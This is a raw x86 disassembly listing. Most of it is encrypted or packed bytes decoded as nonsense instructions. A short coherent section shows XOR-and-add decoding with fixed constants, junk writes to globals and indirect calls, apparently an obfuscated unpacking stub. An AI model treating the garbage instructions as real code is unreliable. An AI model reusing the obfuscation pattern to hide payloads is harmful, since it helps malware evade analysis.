  4083c7:	ror    cl,0xb7
  4083ca:	in     eax,dx
  4083cb:	int3   
  4083cc:	test   ecx,0xc4d4d4ee
  4083d2:	iret   
  4083d3:	ret    0xbdda
  4083d6:	sti    
  4083d7:	lock cli 
  4083d9:	add    esp,edx
  4083db:	xlat   BYTE PTR ds:[ebx]
  4083dc:	add    cl,ch
  4083de:	call   0xce3d86e7
  4083e3:	fldcw  WORD PTR [edi-0x11143c48]
  4083e9:	loop   0x4083c6
  4083eb:	ret    0xcbc1
  4083ee:	call   0xcb1853e4
  4083f3:	rcr    dl,1
  4083f5:	xlat   BYTE PTR ds:[ebx]
  4083f6:	in     al,dx
  4083f7:	(bad)  
  4083f8:	rol    ecx,1
  4083fa:	add    BYTE PTR [eax+0xe507c6],bh
  408400:	jmp    0x4083ca
  408402:	cli    
  408403:	stc    
  408404:	repz out dx,al
  408406:	into   
  408407:	loop   0x4083de
  408409:	not    edi
  40840b:	in     al,dx
  40840c:	clc    
  40840d:	div    eax
  40840f:	repz int3 
  408411:	mov    ch,0xb1
  408413:	loop   0x4083ed
  408415:	pop    es
  408416:	fsubrp st(7),st
  408418:	stc    
  408419:	hlt    
  40841a:	mov    ecx,0xebd6d8dd
  40841f:	add    esp,eax
  408421:	std    
  408422:	or     esp,esp
  408424:	in     eax,dx
  408425:	rol    ebp,1
  408427:	call   0xdb2b50dc
  40842c:	jmp    0xcbde:0xf3ddbbed
  408433:	(bad)  
  408435:	fsub   st(6),st
  408437:	fild   WORD PTR [esi]
  408439:	add    al,0xd5
  40843b:	or     dh,ch
  40843d:	fsubrp st(6),st
  40843f:	fsubr  st(7),st
  408441:	int3   
  408442:	add    ah,bh
  408444:	ret    
  408445:	rol    dl,cl
  408447:	mov    cl,0xe4
  408449:	retf   0xcfd6
  40844c:	in     al,0xd8
  40844e:	fsubr  DWORD PTR [edx+ecx*8-0x1f460c13]
  408455:	in     eax,dx
  408456:	inc    al
  408458:	jecxz  0x408417
  40845a:	repz fadd DWORD PTR [edx+eax*8]
  40845e:	in     al,0x6
  408460:	in     al,dx
  408461:	int    0xef
  408463:	int3   
  408464:	lock enter 0xc9e0,0xd1
  408469:	mov    ah,0xda
  40846b:	out    dx,eax
  40846c:	mov    cl,0xec
  40846e:	xlat   BYTE PTR ds:[ebx]
  40846f:	int    0xd3
  408471:	fcmovne st,st(4)
  408473:	loop   0x408437
  408475:	add    ch,bl
  408477:	not    al
  408479:	hlt    
  40847a:	or     eax,ebp
  40847c:	or     DWORD PTR ds:0xca02c604,eax
  408482:	ficom  WORD PTR [ecx]
  408484:	mov    bl,0xca
  408486:	(bad)  
  408488:	icebp  
  408489:	bnd ret 0xcee0
  40848d:	shl    ebp,1
  40848f:	jmp    0xecd2:0x2d0f5d0
  408496:	mov    esi,0xd1d602ce
  40849b:	add    BYTE PTR [ebx],cl
  40849d:	shr    bl,1
  40849f:	fxch   st(5)
  4084a1:	push   es
  4084a2:	iret   
  4084a3:	adc    eax,edi
  4084a5:	fidiv  WORD PTR [eax-0x381a3720]
  4084ab:	jmp    0x40847f
  4084ad:	cmc    
  4084ae:	out    0xdb,al
  4084b0:	cmc    
  4084b1:	rcl    ebx,cl
  4084b3:	call   0xbd1b7dba
  4084b8:	loopne 0x40847c
  4084ba:	add    ch,bh
  4084bc:	fdivr  QWORD PTR [esi+0x501eb0e]
  4084c2:	or     eax,0xccd7c90e
  4084c7:	enter  0xd4e7,0xeb
  4084cb:	ret    0xf7e4
  4084ce:	jmp    0x40848e
  4084d0:	xlat   BYTE PTR ds:[ebx]
  4084d1:	mov    dl,0xd3
  4084d3:	jmp    0xd93986b1
  4084d8:	std    
  4084d9:	add    bl,dl
  4084db:	cmc    
  4084dc:	jecxz  0x4084b3
  4084de:	jmp    0xea3e5feb
  4084e3:	or     bl,ch
  4084e5:	shl    cl,1
  4084e7:	shl    DWORD PTR [ebx-0x1b0d3811],0xe7
  4084ee:	clc    
  4084ef:	into   
  4084f0:	(bad)  
  4084f2:	leave  
  4084f3:	lock ret 
  4084f5:	(bad)  
  4084f7:	idiv   edx
  4084f9:	repnz cli 
  4084fb:	clc    
  4084fc:	(bad)  
  4084fd:	out    0x9,eax
  4084ff:	jmp    0xe0dd:0xfa010f0d
  408506:	int3   
  408507:	out    dx,eax
  408508:	mov    bh,0xdc
  40850a:	(bad)  
  40850b:	loope  0x4084f7
  40850d:	ftst   
  40850f:	jmp    0x4084f0
  408511:	mov    esi,0xef00e8f0
  408516:	push   es
  408517:	(bad)  
  408518:	icebp  
  408519:	pop    es
  40851a:	shl    edx,cl
  40851c:	add    al,0xdb
  40851e:	fcmovne st,st(3)
  408520:	add    edx,DWORD PTR [ebx]
  408522:	fsubr  st(7),st
  408524:	rol    ah,1
  408526:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408527:	(bad)  
  408528:	fsub   st(5),st
  40852a:	jmp    0x408515
  40852c:	mov    ah,0xf5
  40852e:	(bad)  
  40852f:	cmc    
  408530:	idiv   dl
  408532:	(bad)  
  408534:	fnstcw WORD PTR [eax-0x421f0f2e]
  40853a:	add    DWORD PTR [esp+eax*8],eax
  40853d:	(bad)  
  40853f:	dec    DWORD PTR [esi]
  408541:	adc    ebx,edx
  408543:	iret   
  408544:	out    0xc1,eax
  408546:	retf   0xb2d5
  408549:	call   0xe61a5445
  40854e:	iret   
  40854f:	aad    0xec
  408551:	mov    eax,0xeeb8b0cc
  408556:	mov    edi,0xdaf9fad3
  40855b:	hlt    
  40855c:	rol    BYTE PTR ds:0xe0cad604,0xe1
  408563:	call   0xb032344b
  408568:	jmp    0x40853f
  40856a:	in     al,0xf3
  40856c:	icebp  
  40856d:	out    dx,eax
  40856e:	leave  
  40856f:	sar    eax,cl
  408571:	aad    0xfa
  408573:	into   
  408574:	stc    
  408575:	add    DWORD PTR [ecx],eax
  408577:	out    0xd9,eax
  408579:	cld    
  40857a:	mov    BYTE PTR [edx],0xeb
  40857d:	shl    ch,1
  40857f:	(bad)  
  408580:	loope  0x408588
  408582:	enter  0xd1f8,0xc1
  408586:	in     eax,0xf7
  408588:	out    0xd4,al
  40858a:	lods   al,BYTE PTR ds:[esi]
  40858b:	mov    dh,0xaf
  40858d:	mov    ebx,0xeedeb7e4
  408592:	neg    ebp
  408594:	cmc    
  408595:	std    
  408596:	in     eax,dx
  408597:	(bad)  
  408599:	int3   
  40859a:	jmp    0x408571
  40859c:	std    
  40859d:	loop   0x408582
  40859f:	idiv   ah
  4085a1:	push   es
  4085a2:	out    0xfd,al
  4085a4:	mov    cl,0xd8
  4085a6:	loop   0x40856d
  4085a8:	rol    ebx,cl
  4085aa:	aad    0xc9
  4085ac:	mov    ecx,0xd4b0b6fa
  4085b1:	in     al,dx
  4085b2:	retf   
  4085b3:	mov    edi,0xe6e1e7e9
  4085b8:	in     eax,dx
  4085b9:	fcmovu st,st(0)
  4085bb:	cli    
  4085bc:	std    
  4085bd:	fadd   QWORD PTR [eax]
  4085bf:	into   
  4085c0:	leave  
  4085c1:	add    ecx,DWORD PTR [eax]
  4085c3:	loope  0x408592
  4085c5:	mov    al,0xc7
  4085c7:	scas   al,BYTE PTR es:[edi]
  4085c8:	out    dx,al
  4085c9:	loope  0x4085b1
  4085cb:	(bad)  
  4085cd:	jmp    0xe92b7f97
  4085d2:	loop   0x40858f
  4085d4:	int    0xcd
  4085d6:	mov    ebp,0xdfdedf06
  4085db:	dec    BYTE PTR [edx]
  4085dd:	(bad)  
  4085de:	aam    0xe5
  4085e0:	retf   0xc8c2
  4085e3:	adc    eax,ebp
  4085e5:	in     al,0xc7
  4085e7:	fdivrp st(2),st
  4085e9:	rol    ch,cl
  4085eb:	mov    bl,0xc6
  4085ed:	(bad)  
  4085ef:	jmp    0x4085c7
  4085f1:	cmc    
  4085f2:	aam    0xbf
  4085f4:	lock jecxz 0x4085c5
  4085f7:	push   ecx
  4085f9:	ret    
  4085fa:	push   edi
  4085fc:	std    
  4085fd:	xlat   BYTE PTR ds:[ebx]
  4085fe:	iret   
  4085ff:	mov    esp,0xd9dbee01
  408604:	loopne 0x4085fd
  408606:	scas   eax,DWORD PTR es:[edi]
  408607:	fsubrp st(6),st
  408609:	mov    ch,0xcc
  40860b:	mov    ah,0xd6
  40860d:	cmc    
  40860e:	mov    ch,0xcc
  408610:	aam    0xf2
  408612:	aam    0xb9
  408614:	mov    esp,0x5c3f6fa
  408619:	loop   0x4085ec
  40861b:	fcmovnb st,st(5)
  40861d:	aam    0xcb
  40861f:	fisttp DWORD PTR [ecx]
  408621:	out    0xda,al
  408623:	in     al,0xa7
  408625:	(bad)  
  408626:	retf   0xefd2
  408629:	(bad)  
  40862a:	icebp  
  40862b:	(bad)
  40862e:	mov    ebx,0xefc8f7d1
  408633:	iret   
  408634:	into   
  408635:	add    DWORD PTR [edx],eax
  408637:	test   BYTE PTR [edi],0xd1
  40863a:	(bad)  
  40863c:	retf   0x706
  40863f:	enter  0xdf04,0xc9
  408643:	add    ebp,DWORD PTR [esi-0xf283c22]
  408649:	mov    dh,0xac
  40864b:	xlat   BYTE PTR ds:[ebx]
  40864c:	iret   
  40864d:	(bad)  
  40864e:	iret   
  40864f:	fcomip st,st(1)
  408651:	fstp   TBYTE PTR [ebp-0x1efe0627]
  408657:	fld    st(1)
  408659:	loopne 0x40862d
  40865b:	push   es
  40865c:	add    eax,0xdeca00ea
  408661:	iret   
  408662:	leave  
  408663:	jmp    0x408650
  408665:	in     al,dx
  408666:	mov    cl,0xef
  408668:	call   0xcbf2755b
  40866d:	mov    al,0xf4
  40866f:	mov    edx,0xd7fdedbf
  408674:	mov    edx,0x50001c0
  408679:	(bad)  
  40867a:	(bad)  
  40867c:	jecxz  0x40863e
  40867e:	cli    
  40867f:	or     ch,ah
  408681:	cld    
  408682:	out    dx,eax
  408683:	add    eax,ebx
  408685:	int3   
  408686:	retf   0xf3d1
  408689:	out    0xb4,eax
  40868b:	mov    ch,0xce
  40868d:	mov    ch,0xf5
  40868f:	into   
  408690:	(bad)  
  408691:	in     al,0xb1
  408693:	loop   0x408687
  408695:	repnz rol al,cl
  408698:	in     eax,dx
  408699:	mov    esp,0xe6cbe2d5
  40869e:	fmulp  st(7),st
  4086a0:	iret   
  4086a1:	or     ebx,ebx
  4086a3:	(bad)  
  4086a4:	fadd   st(0),st
  4086a6:	shr    edx,0xcb
  4086a9:	(bad)  
  4086aa:	cmc    
  4086ab:	(bad)  
  4086ac:	jmp    0xd4f0:0xb3d0b4ec
  4086b3:	ret    0xfafd
  4086b6:	sar    DWORD PTR [ebp-0x161f043e],1
  4086bc:	ror    BYTE PTR [ebx],1
  4086be:	rcr    esi,0xd4
  4086c1:	std    
  4086c2:	add    al,0xf
  4086c4:	loopne 0x408688
  4086c6:	shl    DWORD PTR [eax-0x2b1a3215],cl
  4086cc:	jmp    0x408680
  4086ce:	ror    dh,cl
  4086d0:	mov    dh,0xfa
  4086d2:	sti    
  4086d3:	mov    al,0xe2
  4086d5:	shl    edi,cl
  4086d7:	(bad)  
  4086d8:	mov    edi,0xf5c1c3db
  4086dd:	jmp    0x4086db
  4086df:	loop   0x4086d6
  4086e1:	loop   0x4086b0
  4086e3:	enter  0xc8f2,0xc0
  4086e7:	test   eax,0xf8e7cfb3
  4086ed:	shr    BYTE PTR [ebp-0x20272641],1
  4086f3:	loope  0x4086c8
  4086f5:	hlt    
  4086f6:	out    dx,eax
  4086f7:	in     al,dx
  4086f8:	(bad)  
  4086f9:	hlt    
  4086fa:	add    bl,bh
  4086fc:	aad    0xff
  4086fe:	out    dx,eax
  4086ff:	div    ch
  408701:	retf   0xd05
  408704:	out    0xb2,al
  408706:	mov    esp,0xb0efc3f7
  40870b:	(bad)  
  40870c:	cli    
  40870d:	enter  0xf1c8,0xdb
  408711:	lock mov ebx,0xfad7bbfe
  408717:	into   
  408718:	mov    edi,0xc60700e7
  40871d:	loop   0x408702
  40871f:	add    esp,esp
  408721:	cld    
  408722:	(bad)  
  408723:	into   
  408724:	mov    ebp,0xeae8cda6
  408729:	(bad)  
  40872a:	repz int 0xf7
  40872d:	aad    0xb5
  40872f:	in     eax,dx
  408730:	lds    esi,FWORD PTR [edx-0x541474f]
  408736:	iret   
  408737:	cmc    
  408738:	fcmovnu st,st(7)
  40873a:	vcmptruess xmm0,xmm4,DWORD PTR [edi]
  40873f:	cld    
  408740:	jecxz  0x408711
  408742:	call   0xf1203916
  408747:	mov    esi,0xeaefb0ef
  40874c:	mov    al,0xf4
  40874e:	mov    edx,0xdad4b6f5
  408753:	in     eax,dx
  408754:	mov    edi,0xd0da07f2
  408759:	mul    dh
  40875b:	retf   0xc6ca
  40875e:	mov    DWORD PTR [ecx],0xe6eceef8
  408764:	rcl    cl,0xb7
  408767:	call   0xf71c7d62
  40876c:	out    dx,al
  40876d:	out    dx,al
  40876e:	mov    cl,0xfd
  408770:	fld    DWORD PTR [ebx]
  408772:	icebp  
  408773:	out    dx,al
  408774:	mov    esi,0xfcd7f5da
  408779:	cld    
  40877a:	(bad)  
  40877b:	loop   0x408788
  40877d:	por    mm1,QWORD PTR [edi]
  408780:	(bad)  
  408782:	out    0xe1,eax
  408784:	in     al,dx
  408785:	out    dx,al
  408786:	ror    eax,0xc2
  408789:	int3   
  40878a:	ror    ah,1
  40878c:	sar    BYTE PTR [ebx-0x22242e16],1
  408792:	xlat   BYTE PTR ds:[ebx]
  408793:	(bad)  
  408794:	div    bh
  408796:	(bad)  
  408798:	(bad)  
  40879a:	ffree  st(3)
  40879c:	vpmulhw xmm7,xmm0,xmm6
  4087a0:	loope  0x40876c
  4087a2:	add    al,0xda
  4087a4:	mov    esi,0xeff2bff1
  4087a9:	jecxz  0x40876d
  4087ab:	mov    ebx,0xcdd0d5f8
  4087b0:	(bad)  
  4087b2:	out    dx,al
  4087b3:	jecxz  0x4087b7
  4087b5:	in     eax,dx
  4087b6:	xlat   BYTE PTR ds:[ebx]
  4087b7:	(bad)  
  4087b8:	int3   
  4087b9:	std    
  4087ba:	(bad)  
  4087bc:	(bad)  
  4087bd:	(bad)  
  4087be:	(bad)  
  4087bf:	sti    
  4087c0:	out    dx,eax
  4087c1:	fimul  DWORD PTR [eax]
  4087c3:	or     ebx,eax
  4087c5:	int    0xec
  4087c7:	in     al,0xed
  4087c9:	mov    dl,0xec
  4087cb:	loope  0x4087c8
  4087cd:	shl    BYTE PTR [ebp-0x1230054c],1
  4087d3:	fdiv   st(1),st
  4087d5:	add    edx,edx
  4087d7:	add    bh,ch
  4087d9:	mov    ebx,0xfbfde8f5
  4087df:	neg    dh
  4087e1:	or     DWORD PTR [eax+ecx*8],eax
  4087e4:	iret   
  4087e5:	shr    ah,1
  4087e7:	loope  0x4087c5
  4087e9:	ror    esp,cl
  4087eb:	(bad)  
  4087ed:	aam    0xb4
  4087ef:	int3   
  4087f0:	retf   
  4087f1:	mov    ecx,0xd9d8ddd3
  4087f6:	iret   
  4087f7:	jmp    esp
  4087f9:	sar    DWORD PTR [ecx+eax*1-0x122b0af6],cl
  408800:	cmc    
  408801:	or     BYTE PTR ds:0xe0e3c503,al
  408807:	enter  0xefe7,0xc6
  40880b:	mov    edx,0xf0f2cbcb
  408810:	enter  0xd5b8,0xda
  408814:	aad    0xfe
  408816:	cli    
  408817:	sbb    ecx,0x0
  40881a:	or     DWORD PTR ds:0x437773,0x43776f
  408824:	xor    eax,0x8a29a14b
  408829:	xor    ecx,0x0
  40882c:	adc    DWORD PTR ds:0x43770f,0x45ac
  408836:	xor    eax,0x8a29a14b
  40883b:	or     DWORD PTR ds:0x437743,0x680c
  408845:	xor    ecx,0x0
  408848:	adc    DWORD PTR ds:0x437737,0x53d4
  408852:	add    eax,0x5424137
  408857:	adc    ecx,0x0
  40885a:	sbb    ecx,DWORD PTR ds:0x437723
  408860:	mov    ecx,DWORD PTR [ebp-0x4]
  408863:	and    DWORD PTR ds:0x4377b3,0x437713
  40886d:	mov    ecx,DWORD PTR [ecx]
  40886f:	sub    DWORD PTR ds:0x43777b,0x4c6e
  408879:	xor    ecx,eax
  40887b:	mov    eax,DWORD PTR [ebp-0x4]
  40887e:	mov    DWORD PTR [eax],ecx
  408880:	and    DWORD PTR ds:0x43776f,0x0
  40888a:	mov    ecx,DWORD PTR ds:0x43776f
  408890:	inc    ecx
  408891:	mov    DWORD PTR ds:0x43776f,ecx
  408897:	cmp    DWORD PTR ds:0x43776f,0x21
  40889e:	jge    0x4088c4
  4088a4:	jmp    0x4088b7
  4088a9:	push   0x43777f
  4088ae:	push   DWORD PTR [ebp-0xc]
  4088b1:	call   DWORD PTR ds:0x43c990
  4088b7:	cmp    DWORD PTR ds:0x43776f,0x1e
  4088be:	jb     0x40888a
  4088c4:	mov    eax,DWORD PTR [ebp+0x14]
  4088c7:	mov    eax,DWORD PTR [eax]
  4088c9:	sbb    ecx,DWORD PTR ds:0x4377b7
  4088cf:	mov    DWORD PTR [ebp-0x24],eax
  4088d2:	mov    DWORD PTR ds:0x43777f,0x1e
  4088dc:	cmp    DWORD PTR ds:0x43777f,0x0
  4088e3:	je     0x408942
  4088e9:	cmp    DWORD PTR ds:0x43777f,0xf
  4088f0:	jbe    0x408942
  4088f6:	jmp    0x408916
  4088fb:	push   DWORD PTR [ebp-0x20]
  4088fe:	push   0x79ea
  408903:	push   0x437038
  408908:	push   0x43707c
  40890d:	push   DWORD PTR [ebp-0x24]
  408910:	call   DWORD PTR ds:0x43c994
  408916:	cmp    DWORD PTR ds:0x43777f,0x10
  40891d:	jne    0x408930
  408923:	mov    ecx,DWORD PTR ds:0x43777f
  408929:	dec    ecx
  40892a:	mov    DWORD PTR ds:0x43777f,ecx
  408930:	mov    ecx,DWORD PTR ds:0x43777f
  408936:	dec    ecx
  408937:	mov    DWORD PTR ds:0x43777f,ecx
  40893d:	jmp    0x4088dc
  408942:	mov    eax,DWORD PTR [ebp-0x24]
  408945:	mov    eax,DWORD PTR [eax]
  408947:	sbb    DWORD PTR ds:0x437717,ebx
  40894d:	mov    ecx,DWORD PTR [ebp-0x4]
  408950:	mov    ecx,DWORD PTR [ecx]
  408952:	or     DWORD PTR ds:0x437733,0x5314
  40895c:	xor    edx,edx
  40895e:	sub    ecx,0x5424137
  408964:	mov    DWORD PTR ds:0x43778b,0x2c2f
  40896e:	sbb    edx,0x0
  408971:	xor    ecx,0x8a29a14b
  408977:	xor    DWORD PTR ds:0x4377b3,0x4c4d
  408981:	xor    edx,0x0
  408984:	add    DWORD PTR ds:0x437787,0x4377b3
  40898e:	xor    ecx,0x8a29a14b
  408994:	and    DWORD PTR ds:0x437717,0x380f
  40899e:	xor    edx,0x0
  4089a1:	add    ecx,0x5424137
  4089a7:	mov    DWORD PTR ds:0x437713,0x5282
  4089b1:	adc    edx,0x0
  4089b4:	mov    eax,DWORD PTR [eax]
  4089b6:	add    DWORD PTR ds:0x43775f,0x43771b
  4089c0:	xor    esi,esi
  4089c2:	sbb    DWORD PTR ds:0x437783,0x7cb2
  4089cc:	add    eax,ecx
  4089ce:	adc    esi,edx
  4089d0:	mov    DWORD PTR ds:0x43773f,edi
  4089d6:	mov    ecx,DWORD PTR [ebp-0x24]
  4089d9:	mov    ecx,DWORD PTR [ecx]
  4089db:	mov    DWORD PTR ds:0x43775b,0x153c
  4089e5:	mov    DWORD PTR [ecx],eax
  4089e7:	mov    eax,DWORD PTR [ebp-0xc]
  4089ea:	mov    DWORD PTR [eax],0x70941f81
  4089f0:	mov    DWORD PTR [eax+0x4],0xffffffff
  4089f7:	jmp    0x40d295
  4089fc:	mov    eax,ds:0x43775b
  408a01:	xor    eax,DWORD PTR ds:0x4377a3
  408a07:	mov    ds:0x43775b,eax
  408a0c:	jmp    0x40ad5a
  408a11:	jl     0x4089e1
  408a13:	push   0x542468a2
  408a18:	hlt    
  408a19:	pop    ds
  408a1a:	nop
  408a1b:	leave  
  408a1c:	mov    dh,BYTE PTR [esi-0x6a]
  408a1f:	xor    BYTE PTR [ecx+0x7b7be208],dh
  408a25:	stos   BYTE PTR es:[edi],al
  408a26:	cwde   
  408a27:	jnp    0x408aa4
  408a29:	add    eax,0xc2eadbda
  408a2e:	dec    cl
  408a30:	loop   0x408a39
  408a32:	in     eax,0xea
  408a34:	(bad)  
  408a36:	jmp    0xcf2f7c1c
  408a3b:	aad    0xe3
  408a3d:	repnz sar BYTE PTR [edx-0x82e491c],1
  408a44:	mov    ah,0xd7
  408a46:	loop   0x408a2f
  408a48:	mov    esp,0xc5d1dcff
  408a4d:	sar    bl,cl
  408a4f:	shl    al,0xe
  408a52:	ret    
  408a53:	int3   
  408a54:	out    dx,eax
  408a55:	cli    
  408a56:	loopne 0x408a15
  408a58:	mov    esi,0xf2e5c7e3
  408a5d:	icebp  
  408a5e:	neg    ebx
  408a60:	(bad)  
  408a61:	mov    bh,0xcb
  408a63:	lock std 
  408a65:	leave  
  408a66:	repz sti 
  408a68:	stc    
  408a69:	repz stc 
  408a6b:	fiadd  DWORD PTR [eax]
  408a6d:	xlat   BYTE PTR ds:[ebx]
  408a6e:	ffree  st(5)
  408a70:	fmul   st,st(1)
  408a72:	(bad)  
  408a73:	or     al,0xeb
  408a75:	rol    ah,cl
  408a77:	ret    
  408a78:	retf   
  408a79:	jecxz  0x408a67
  408a7b:	(bad)  
  408a7d:	(bad)  
  408a7e:	out    0xd1,al
  408a80:	fcomi  st,st(6)
  408a82:	out    dx,al
  408a83:	jecxz  0x408a5b
  408a85:	mov    eax,0xc7f8dfb7
  408a8a:	lock (bad) 
  408a8c:	(bad)  
  408a8e:	(bad)  
  408a8f:	fcomip st,st(6)
  408a91:	in     al,0xe7
  408a93:	loopne 0x408a9c
  408a95:	call   0xc11f5d88
  408a9a:	out    0xd1,al
  408a9c:	cmc    
  408a9d:	icebp  
  408a9e:	stc    
  408a9f:	imul   bl
  408aa1:	div    bl
  408aa3:	mov    edx,0xd2f6d8
  408aa8:	fidivr WORD PTR [eax-0x2e252714]
  408aae:	add    esp,edi
  408ab0:	retf   0xfad9
  408ab3:	leave  
  408ab4:	jmp    0xd3c3:0xccb1eadc
  408abb:	jmp    0x408a66
  408abd:	rol    esi,1
  408abf:	repz int3 
  408ac1:	int    0xba
  408ac3:	fdivr  st,st(2)
  408ac5:	jmp    0xd82d859c
  408aca:	(bad)  
  408acb:	mov    esp,0xe7ddc2d3
  408ad0:	(bad)  
  408ad1:	(bad)  
  408ad3:	push   cs
  408ad4:	cli    
  408ad5:	in     eax,dx
  408ad6:	(bad)  
  408ad8:	ret    
  408ad9:	jmp    0xf0cd:0xc0dbdcd3
  408ae0:	(bad)  
  408ae1:	mov    ebx,0xf6beb2d3
  408ae6:	fdivr  st,st(2)
  408ae8:	pop    es
  408ae9:	icebp  
  408aea:	lock pop es
  408aec:	or     esp,ecx
  408aee:	lock clc 
  408af0:	cmc    
  408af1:	fisttp WORD PTR [ebx]
  408af3:	add    ecx,DWORD PTR [edx]
  408af5:	std    
  408af6:	rol    bh,0xcb
  408af9:	out    0xc7,eax
  408afb:	retf   
  408afc:	int    0xc0
  408afe:	repz in al,0xdb
  408b01:	(bad)  
  408b02:	cld    
  408b03:	std    
  408b04:	fiadd  WORD PTR [edx]
  408b06:	cld    
  408b07:	jecxz  0x408ac9
  408b09:	fld    QWORD PTR [ebx]
  408b0b:	out    0xe1,al
  408b0d:	fucomip st,st(1)
  408b0f:	or     esp,ebx
  408b11:	call   0xc93c671f
  408b16:	lods   eax,DWORD PTR ds:[esi]
  408b17:	xlat   BYTE PTR ds:[ebx]
  408b18:	ret    0xe3de
  408b1b:	rcl    ch,1
  408b1d:	mov    ch,0xe5
  408b1f:	mov    ch,0xf9
  408b21:	aam    0xfc
  408b23:	mov    dh,0xed
  408b25:	mov    esp,0xc6d0dae2
  408b2a:	fldpi  
  408b2c:	cld    
  408b2d:	jmp    0xc0508514
  408b32:	iret   
  408b33:	fucomi st,st(0)
  408b35:	out    dx,eax
  408b36:	enter  0xdced,0xd0
  408b3a:	jecxz  0x408b25
  408b3c:	aam    0xb2
  408b3e:	mov    dh,0xd4
  408b40:	xabort 0xc8
  408b43:	(bad)  
  408b44:	hlt    
  408b45:	idiv   edx
  408b47:	loope  0x408b25
  408b49:	into   
  408b4a:	out    0xdb,al
  408b4c:	clc    
  408b4d:	(bad)  
  408b4f:	std    
  408b50:	or     ebx,ebx
  408b52:	cmc    
  408b53:	cld    
  408b54:	in     al,dx
  408b55:	clc    
  408b56:	in     eax,0xb1
  408b58:	test   eax,0xe5e7dcdc
  408b5d:	icebp  
  408b5e:	retf   0xe9e9
  408b61:	iret   
  408b62:	(bad)  
  408b63:	call   0xe81c4f47
  408b68:	rcl    edx,0x4
  408b6b:	stc    
  408b6c:	cli    
  408b6d:	(bad)  
  408b6e:	(bad)  
  408b6f:	retf   
  408b70:	fcmovnu st,st(3)
  408b72:	psubusw mm1,mm6
  408b75:	shufps xmm5,xmm2,0xf1
  408b79:	(bad)  
  408b7a:	in     al,0xf7
  408b7c:	mov    dh,0xd3
  408b7e:	mov    bl,0xf9
  408b80:	aam    0xe9
  408b82:	lock call 0xd010818b
  408b88:	repz loop 0x408b8d
  408b8b:	int3   
  408b8c:	les    ecx,FWORD PTR [ecx]
  408b8e:	push   es
  408b8f:	fcmovbe st,st(4)
  408b91:	sti    
  408b92:	lds    eax,FWORD PTR ds:0xecccdafb
  408b98:	int3   
  408b99:	call   0xcc05525f
  408b9e:	loope  0x408b50
  408ba0:	mov    bh,0xd3
  408ba2:	aam    0xd0
  408ba4:	fmulp  st(0),st
  408ba6:	add    ecx,esi
  408ba8:	mov    ebp,0x3fac1d2
  408bad:	rol    edi,0xc4
  408bb0:	or     ebx,edx
  408bb2:	or     edi,ebx
  408bb4:	add    al,BYTE PTR [eax+eax*8]
  408bb7:	loope  0x408b75
  408bb9:	mov    dl,0xdd
  408bbb:	loop   0x408b66
  408bbd:	mov    ch,0xf0
  408bbf:	out    0xad,eax
  408bc1:	shl    DWORD PTR [ebp-0x2717090c],cl
  408bc7:	repz aad 0xda
  408bca:	add    ah,al
  408bcc:	loopne 0x408bcb
  408bce:	hlt    
  408bcf:	pop    es
  408bd0:	add    ebp,edx
  408bd2:	cli    
  408bd3:	int3   
  408bd4:	out    0xcd,eax
  408bd6:	icebp  
  408bd7:	out    0xd2,eax
  408bd9:	(bad)  
  408bda:	imul   ebx
  408bdc:	mov    bh,0xcf
  408bde:	mov    ch,0xd9
  408be1:	mov    eax,0xf5badce8
  408be6:	enter  0xd5c2,0xed
  408bea:	add    dl,bh
  408bec:	push   es
  408bed:	jmp    0xc54f62dc
  408bf2:	(bad)  
  408bf4:	fsub   st,st(1)
  408bf6:	icebp  
  408bf7:	icebp  
  408bf8:	xlat   BYTE PTR ds:[ebx]
  408bf9:	leave  
  408bfa:	iret   
  408bfb:	(bad)  
  408bfc:	loope  0x408bde
  408bfe:	(bad)  
  408bff:	(bad)
  408c02:	xlat   BYTE PTR ds:[ebx]
  408c03:	neg    bl
  408c05:	rcl    esi,1
  408c07:	lock out 0xc2,al
  408c0a:	add    eax,0xe8e0f8de
  408c0f:	retf   0xc7cf
  408c12:	fmul   QWORD PTR [ecx]
  408c14:	repz add BYTE PTR [edi-0xe483b1b],ch
  408c1b:	aam    0xf1
  408c1d:	enter  0xcbcb,0xee
  408c21:	fnstcw WORD PTR [eax-0x482c4309]
  408c27:	mov    dh,0xd5
  408c29:	mov    esi,0xe6d6e5e4
  408c2e:	cmc    
  408c2f:	out    0x8,al
  408c31:	in     al,0xd
  408c33:	sti    
  408c34:	std    
  408c35:	out    0xed,al
  408c37:	ret    
  408c38:	leave  
  408c39:	in     eax,dx
  408c3a:	jmp    0xb1ef:0xece8b5f0
  408c41:	test   dl,0xd0
  408c44:	(bad)  
  408c46:	ret    
  408c47:	ret    
  408c48:	int3   
  408c49:	xlat   BYTE PTR ds:[ebx]
  408c4a:	cld    
  408c4b:	in     eax,0xe0
  408c4d:	ret    
  408c4e:	rcl    esi,0xfe
  408c51:	or     al,bl
  408c53:	loopne 0x408c3a
  408c55:	add    ebx,ecx
  408c57:	fbstp  TBYTE PTR [ecx-0x13393d31]
  408c5d:	rol    bh,1
  408c5f:	iret   
  408c60:	enter  0xccf4,0xf8
  408c64:	fcomi  st,st(5)
  408c66:	add    edi,DWORD PTR [edx-0x1d3c1133]
  408c6c:	rcr    esi,cl
  408c6e:	inc    al
  408c70:	or     ebp,ebp
  408c72:	loope  0x408c72
  408c74:	fild   WORD PTR [ecx]
  408c76:	stos   BYTE PTR es:[edi],al
  408c77:	int3   
  408c78:	ror    al,cl
  408c7a:	jmp    0xf5fb442f
  408c7f:	out    0xf8,eax
  408c81:	fnstenv [edi-0xc082428]
  408c87:	xlat   BYTE PTR ds:[ebx]
  408c88:	int    0xc3
  408c8a:	mov    ebp,0xebc2e6e5
  408c8f:	cld    
  408c90:	xlat   BYTE PTR ds:[ebx]
  408c91:	in     al,0xc8
  408c93:	add    ebx,esp
  408c95:	or     eax,0xe7eee8aa
  408c9a:	loop   0x408c67
  408c9c:	loopne 0x408c5f
  408c9e:	lds    esi,FWORD PTR [ebp-0x1149132e]
  408ca4:	fcmovu st,st(1)
  408ca6:	mov    ebp,0xe5e5d5b9
  408cab:	out    0xe7,al
  408cad:	(bad)  
  408cae:	stc    
  408caf:	jecxz  0x408c98
  408cb1:	push   es
  408cb2:	jmp    0x408c96
  408cb4:	fimul  DWORD PTR [esi]
  408cb6:	into   
  408cb7:	imul   DWORD PTR [ecx-0x14553852]
  408cbd:	shl    ecx,0xe6
  408cc0:	lds    edi,FWORD PTR [edi-0x12334434]
  408cc6:	aam    0xfd
  408cc8:	(bad)  
  408cc9:	clc    
  408cca:	hlt    
  408ccb:	mov    ebp,0xc1fad904
  408cd0:	fcomp  st(3)
